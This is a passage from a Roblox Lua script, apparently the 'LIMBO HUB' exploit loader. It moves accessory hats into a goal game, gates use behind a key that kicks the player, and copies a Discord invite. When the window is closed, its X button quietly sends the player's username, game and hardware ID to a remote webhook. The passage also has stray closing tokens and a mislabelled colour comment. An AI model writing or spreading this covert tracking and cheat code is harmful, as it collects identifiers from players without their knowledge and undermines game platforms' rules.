                    local kickDirection = (hat.Handle.Position - otherPart.Position).unit * 50 -- Adjust kick strength
                    
                    -- Apply an impulse to the hat
                    hat.Handle.Velocity = hat.Handle.Velocity + kickDirection
                end
            end

            -- Connect the touch event
            hat.Handle.Touched:Connect(onTouch)

            -- Control the hat's friction
            local function controlFriction()
                while true do
                    -- Reduce the velocity gradually for natural slowing down
                    hat.Handle.Velocity = hat.Handle.Velocity * 0.65 -- Adjust friction value (1 = no friction, <1 = more friction)
                    wait(0.1) -- Control the update rate
                end
            end

            -- Start the friction control loop
            coroutine.wrap(controlFriction)()
        end

    else
        warn("Hat named '" .. hatName .. "' not found in character.")
    end
end

-- Set the desired angle directly (for example, to face 180 degrees)
local desiredAngle = 180 -- Set this to the exact angle you want to face

-- Calculate the new CFrame based on the desired angle
local humanoidRootPart = Character:WaitForChild("HumanoidRootPart")
humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position) * CFrame.Angles(0, math.rad(desiredAngle), 0)

-- Fixed positions for the BaseballBats
local batOffsetFrontRight = humanoidRootPart.Position + humanoidRootPart.CFrame.LookVector * 30 + Vector3.new(6, -1, 0)  -- Front right bat
local batOffsetFrontLeft = humanoidRootPart.Position + humanoidRootPart.CFrame.LookVector * 30 + Vector3.new(-6, -1, 0) -- Front left bat
local batOffsetBackRight = humanoidRootPart.Position + humanoidRootPart.CFrame.LookVector * -30 + Vector3.new(6, -1, 0) -- Back right bat
local batOffsetBackLeft = humanoidRootPart.Position + humanoidRootPart.CFrame.LookVector * -30 + Vector3.new(-6, -1, 0) -- Back left bat

-- Calculate orientation to face the player (rotation is the same for all)
local batOrientation = Vector3.new(0, 180, 0) -- Rotate 180 degrees to face the player

-- Modify the BaseballBat hats
modifyHat("BaseballBat", false, batOffsetFrontRight, batOrientation)
modifyHat("BaseballBat", false, batOffsetFrontLeft, batOrientation)
modifyHat("BaseballBat", false, batOffsetBackRight, batOrientation)
modifyHat("BaseballBat", false, batOffsetBackLeft, batOrientation)

-- Function to create a half-transparent red brick
local function createMiddleBrick(position)
    local middleBrick = Instance.new("Part")
    middleBrick.Size = Vector3.new(11.5, 9, 1) -- Adjust size as needed
    middleBrick.Color = Color3.new(0.000000, 1.000000, 0.215686) -- Red color
    middleBrick.Transparency = 0.8 -- Half transparent
    middleBrick.Anchored = true -- Make sure it's anchored
    middleBrick.CanCollide = true -- Allow collisions
    middleBrick.Position = position -- Position it in the center of the bats
    middleBrick.Parent = workspace -- Add it to the workspace
    return middleBrick -- Return the created brick
end



-- Create half-transparent bricks in the middle of both goal areas
local frontMiddleBrick = createMiddleBrick(Vector3.new((batOffsetFrontRight.X + batOffsetFrontLeft.X) / 2, 0, (batOffsetFrontRight.Z + batOffsetFrontLeft.Z) / 2)) -- Front middle brick
local backMiddleBrick = createMiddleBrick(Vector3.new((batOffsetBackRight.X + batOffsetBackLeft.X) / 2, 0, (batOffsetBackRight.Z + batOffsetBackLeft.Z) / 2)) -- Back middle brick

-- Modify the "Space Cop" hat (falling)
local spaceCopInitialPosition = humanoidRootPart.Position + Vector3.new(0, 5, 2)
modifyHat("Space Cop", true, spaceCopInitialPosition, Vector3.new(0, 0, 0)) -- Default position and rotation for Space Cop

-- Store the original position of Space Cop for respawning
local originalPosition = spaceCopInitialPosition

-- Create the Sound instance
local respawnSound = Instance.new("Sound")
respawnSound.SoundId = "rbxassetid://2686079706" -- Replace with your sound ID
respawnSound.Volume = 1 -- Set volume (0 to 1)
respawnSound.Looped = false -- Ensure it doesn't loop
respawnSound.Parent = workspace -- Parent to workspace or the "Space Cop" hat

-- Function to check if Space Cop goes between any Baseball Bats
local function checkPosition()
    while true do
        wait(0.3) -- Check every 0.1 seconds

        local spaceCop = workspace:FindFirstChild("Space Cop") -- Changed to search in workspace
        if spaceCop and spaceCop:FindFirstChild("Handle") then
            local spaceCopPosition = spaceCop.Handle.Position

            -- Check if the Space Cop is between the front two bats
            if spaceCopPosition.Z > batOffsetFrontLeft.Z and spaceCopPosition.Z < batOffsetFrontRight.Z and
               spaceCopPosition.X > batOffsetFrontLeft.X - 3 and spaceCopPosition.X < batOffsetFrontRight.X + 3 then
                spaceCop.Handle.Position = originalPosition
                respawnSound:Play() -- Play the sound on respawn
                print("Space Cop respawned at the original position (front). Playing sound.")
            end

            -- Check if the Space Cop is between the back two bats
            if spaceCopPosition.Z > batOffsetBackLeft.Z and spaceCopPosition.Z < batOffsetBackRight.Z and
               spaceCopPosition.X > batOffsetBackLeft.X - 3 and spaceCopPosition.X < batOffsetBackRight.X + 3 then
                spaceCop.Handle.Position = originalPosition
                respawnSound:Play() -- Play the sound on respawn
                print("Space Cop respawned at the original position (back). Playing sound.")
            end
        else
            print("Space Cop not found. Removing middle bricks.")
            frontMiddleBrick:Destroy() -- Remove front middle brick
            backMiddleBrick:Destroy() -- Remove back middle brick
            break -- Exit the loop
        end
    end
end


-- Touch detection for the middle bricks
local function onMiddleBrickTouched(otherPart)
    -- Check if the touching part is the Space Cop
    local spaceCop = workspace:FindFirstChild("Space Cop")
    if spaceCop and otherPart.Parent == spaceCop then
        -- Respawn the Space Cop at the original position
        spaceCop.Handle.Position = originalPosition
        print("Space Cop respawned at the original position (touched brick).")
    end
end

-- Connect the touch events for the middle bricks
frontMiddleBrick.Touched:Connect(onMiddleBrickTouched)
backMiddleBrick.Touched:Connect(onMiddleBrickTouched)

-- Start the position checking loop
coroutine.wrap(checkPosition)()

    
    end
}

































end)

UICorner_3.Parent = TextButton

Updates.Name = "Updates"
Updates.Parent = Frame
Updates.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Updates.BackgroundTransparency = 0.900
Updates.BorderColor3 = Color3.fromRGB(0, 0, 0)
Updates.BorderSizePixel = 0
Updates.Position = UDim2.new(0.307917893, 0, 0.679558039, 0)
Updates.Size = UDim2.new(0, 130, 0, 35)
Updates.Font = Enum.Font.GrenzeGotisch
Updates.Text = "DISCORD"
Updates.TextColor3 = Color3.new(1.000000, 0.450980, 0.000000)
Updates.TextScaled = true
Updates.TextSize = 14.000
Updates.TextWrapped = true
Updates.Active = false

Updates.MouseEnter:Connect(function()
hoversound:Play()
end)

Updates.MouseButton1Down:Connect(function()
clicksound:Play()
setclipboard("https://discord.gg/DNMr7qC2r3")
game:GetService("StarterGui"):SetCore("SendNotification",{
    
	Title = "LIMBO", -- Required
	Text = "Discord Copied To Clipboard", -- Required
	Icon = "http://www.roblox.com/asset/?id=18505728201" -- Optional
})
notisound:Play()

end)

UICorner_4.Parent = Updates

else

setclipboard("https://discord.gg/DNMr7qC2r3")
game.Players.LocalPlayer:Kick("Wrong Key, Discord Copied To Clipboard.") 

end
end)

dc.Name = "dc"
dc.Parent = Frame
dc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
dc.BackgroundTransparency = 1.000
dc.BorderColor3 = Color3.fromRGB(0, 0, 0)
dc.BorderSizePixel = 0
dc.Position = UDim2.new(0.56891495, 0, 0.6961326, 0)
dc.Size = UDim2.new(0, 39, 0, 39)
dc.Image = "http://www.roblox.com/asset/?id=18505728201"
dc.MouseEnter:Connect(function()
hoversound:Play()
end)
dc.MouseButton1Down:Connect(function()
clicksound:Play()
setclipboard("https://discord.gg/DNMr7qC2r3")
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "LIMBO", -- Required
	Text = "Discord Copied To Clipboard", -- Required
	Icon = "http://www.roblox.com/asset/?id=18505728201" -- Optional
})
notisound:Play()
end)

X.Name = "X"
X.Parent = Frame
X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
X.BackgroundTransparency = 1.000
X.BorderColor3 = Color3.fromRGB(0, 0, 0)
X.BorderSizePixel = 0
X.Position = UDim2.new(0.876832843, 0, 0.0552486181, 0)
X.Size = UDim2.new(0, 32, 0, 32)
X.Image = "http://www.roblox.com/asset/?id=2195446979"

X.MouseEnter:Connect(function()
hoversound:Play()
end)

X.MouseButton1Down:Connect(function()

clicksound:Play()
Frame:Destroy()
local embed = {
    ["title"] = "Player just quitted login page!",
    ["description"] = "A player just pressed the X button on the loader",
    ["color"] = 1,
    ["fields"] = {
        {
            ["name"] = "User",
            ["value"] = notiname
        },
        {
            ["name"] = "Game",
            ["value"] = gameName
        }
    },
    ["footer"] = {
        ["text"] = "HWID: "..hwid
    }
}
SendMessageEMBED(url, embed)
end)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.20527859, 0, 0.0552486181, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.GrenzeGotisch
TextLabel.Text = "LIMBO HUB"
TextLabel.TextColor3 = Color3.new(1.000000, 0.450980, 0.000000)
TextLabel.TextScaled = true
TextLabel.TextSize = 40.000
TextLabel.TextWrapped = true

